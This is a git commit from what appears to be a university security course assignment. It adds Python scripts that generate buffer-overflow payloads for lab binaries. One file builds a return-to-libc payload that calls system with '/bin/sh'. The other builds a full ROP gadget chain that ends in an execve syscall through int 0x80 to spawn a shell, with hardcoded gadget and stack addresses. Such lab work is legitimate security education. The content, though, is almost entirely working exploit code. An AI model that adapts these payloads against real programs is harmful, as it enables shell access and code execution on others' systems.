e1eaece666171e2a44ac8459814b8945ffe0d52b
stevenchiu30801 <steven30801@gmail.com>
2017-10-02 00:32:52 -0400

    upload 2.2.9

--- mp2/files/2.2.6.py
+++ mp2/files/2.2.6.py
@@ -1,5 +1,9 @@
 from shellcode import shellcode
 from struct import pack
 system_addr = pack("<I", 0x0804a030)
-sh_addr = pack("<I", 0x80c61e5)
-print 'A' * 22 + system_addr + 'AAAA' + sh_addr
+sh_addr = pack("<I", 0xbffeeb48)
+print 'A' * 22 + system_addr + 'AAAA' + sh_addr + "/bin/sh"
+## Find "/bin/sh" in libc using gdb.
+## (gdb) find system_addr, +999999, "/bin/sh"
+# sh_addr = pack("<I", 0x80c61e5)
+# print 'A' * 22 + system_addr + 'AAAA' + sh_addr
---
+++ mp2/files/2.2.9.py
@@ -0,0 +1,44 @@
+from struct import pack
+
+gadget_chain = ''
+ebp_addr = 0xbffeeb38
+nul_addr = ebp_addr + 56
+sh_addr = ebp_addr + 60
+# xor %eax, %eax
+gadget_chain += pack("<I", 0x08051750)
+
+# pop %edx
+gadget_chain += pack("<I", 0x0805733a)
+# nul address
+gadget_chain += pack("<I", nul_addr)
+
+# mov %eax, (%edx)
+gadget_chain += pack("<I", 0x0808e97d)	# mov %eax, (%edx); pop %ebx - 0x08080866
+
+# add %eax, $4; pop %edi
+gadget_chain += pack("<I", 0x0807c75f)
+# fill-up
+gadget_chain += pack("<I", 0x41414141)
+# add %eax, $7; pop %edi
+gadget_chain += pack("<I", 0x0807c3bb)
+# pop %ebx
+gadget_chain += pack("<I", 0x41414141)
+
+# gadget_chain += pack("<I", 0x080481ec)
+# 0x0b0b0b0b
+# gadget_chain += pack("<I", 0x0b0b0b0b)
+# add %bh, %al
+# gadget_chain += pack("<I", 0x0808f68d)
+
+# pop %edx; pop %ecx; pop %ebx
+gadget_chain += pack("<I", 0x08057360)
+# nul address
+gadget_chain += pack("<I", nul_addr)
+gadget_chain += pack("<I", nul_addr)
+# "/bin/sh\0" address
+gadget_chain += pack("<I", sh_addr)
+
+# int $0x80
+gadget_chain += pack("<I", 0x080494f9)
+ 
+print 'A' * 112 + gadget_chain + 'AAAA' + '/bin/sh\x00'
